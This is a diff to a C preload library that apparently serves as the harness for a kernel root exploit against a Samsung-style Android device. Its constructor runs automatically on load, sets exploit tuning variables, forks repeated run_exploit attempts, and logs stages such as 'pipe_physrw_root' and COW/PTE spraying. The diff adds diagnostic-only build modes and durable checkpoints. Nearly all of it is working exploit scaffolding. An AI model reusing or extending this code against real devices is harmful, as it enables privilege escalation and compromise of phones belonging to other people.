@@ -12,6 +12,12 @@
 #define DEFAULT_PSELECT_DELAY_USEC 20000
 #define APP_MIN_BOOT_UPTIME_SEC 120
 
+#define RMG_STRINGIFY_INNER(value) #value
+#define RMG_STRINGIFY(value) RMG_STRINGIFY_INNER(value)
+#ifndef RMG_DIAG_COW_PTE_MB
+#define RMG_DIAG_COW_PTE_MB 64
+#endif
+
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 struct app_p0_shared_state {
   atomic_int dirty;
@@ -87,7 +93,13 @@ static void apply_validated_app_profile(void) {
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
   SYSCHK(setenv("CONTROLLED_RECLAIM", "1", 1));
   SYSCHK(setenv("READINESS_PAUSE", "1", 1));
+#if (defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY) || \
+    (defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY) || \
+    (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
+  SYSCHK(setenv("READINESS_PTE_MB", RMG_STRINGIFY(RMG_DIAG_COW_PTE_MB), 1));
+#else
   SYSCHK(setenv("READINESS_PTE_MB", "16384", 1));
+#endif
   SYSCHK(setenv("EXPLOIT_ATTEMPTS", "1", 1));
   SYSCHK(setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "900", 1));
   SYSCHK(setenv("P0_ATTEMPT_TIMEOUT_SEC", "900", 1));
@@ -115,9 +127,28 @@ __attribute__((constructor)) static void load(void) {
     return;
   }
   started = 1;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint_reset();
+  rmg_diag_checkpoint("constructor-entry", getpid(), getuid());
+#endif
+#if defined(RMG_DIAG_LOAD_ONLY) && RMG_DIAG_LOAD_ONLY
+  rmg_diag_checkpoint("load-only-before-exit", getpid(), getuid());
+  static const char marker[] =
+      "RMG_LOAD_ONLY build=r9q-g990b-load-only-20261125-01 "
+      "checkpoint=/data/local/tmp/rmg-load-only-r9q-G990B-20261125.log "
+      "exit=42\n";
+  (void)write(STDERR_FILENO, marker, sizeof(marker) - 1);
+  _exit(42);
+#endif
   set_unbuffer();
   apply_validated_app_profile();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("profile-applied", 0, 0);
+#endif
   wait_for_boot_quiet_window();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("boot-quiet-window-done", 0, 0);
+#endif
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
@@ -134,6 +165,14 @@ __attribute__((constructor)) static void load(void) {
   if (getenv("SLIDE_ONLY")) {
     max_attempts = 1;
   }
+#if defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM
+  /* This diagnostic must perform at most one collector pass. */
+  max_attempts = 1;
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  /* The timing-sensitive COW diagnostic must never retry on its own. */
+  max_attempts = 1;
+#endif
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
   app_p0_state = mmap(NULL, sizeof(*app_p0_state), PROT_READ | PROT_WRITE,
@@ -148,13 +187,48 @@ __attribute__((constructor)) static void load(void) {
   char *argv[] = {"preload.so", NULL};
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=%d diagnostic=cow-only "
+             "cfi_write_pipe_physrw_root=disabled\n",
+             RMG_DIAG_COW_PTE_MB);
+#elif defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && \
+    RMG_DIAG_UCLAMP_TRIGGER_ONLY
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=%d diagnostic=uclamp-trigger-only "
+             "cfi_write_pipe_physrw_root=disabled\n",
+             RMG_DIAG_COW_PTE_MB);
+#elif defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=%d diagnostic=pi-probe-only cfi_root=disabled\n",
+             RMG_DIAG_COW_PTE_MB);
+#elif defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY
+#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=%d diagnostic=fops-readback-only "
+             "cfi_write_pipe_physrw_root=disabled\n",
+             RMG_DIAG_COW_PTE_MB);
+#else
+  pr_success("validated route controlled_reclaim=on readiness_pause=on "
+             "pte_mb=%d diagnostic=cfi-only pipe_physrw_root=disabled\n",
+             RMG_DIAG_COW_PTE_MB);
+#endif
+#elif defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM
+  pr_success("validated diagnostic=controlled-mm-only scan_timeout_ms=%d "
+             "attempts=1 fops_root=disabled\n",
+             RMG_DIAG_MM_SCAN_TIMEOUT_MS);
+#else
   pr_success("validated route controlled_reclaim=on readiness_pause=on "
              "pte_mb=16384\n");
+#endif
 #endif
   pr_success("preload supervisor pid=%d attempts=%d base_delay=%d "
              "p0_timeout=%d timeout=%d\n",
              getpid(), max_attempts, base_delay, p0_attempt_timeout_sec,
              attempt_timeout_sec);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("supervisor-ready", max_attempts, base_delay);
+#endif
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
@@ -180,6 +254,9 @@ __attribute__((constructor)) static void load(void) {
 #else
       pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                  attempt, max_attempts, getpid(), delay_usec);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("child-entry", attempt, getpid());
 #endif
       _exit(run_exploit(1, argv));
     }
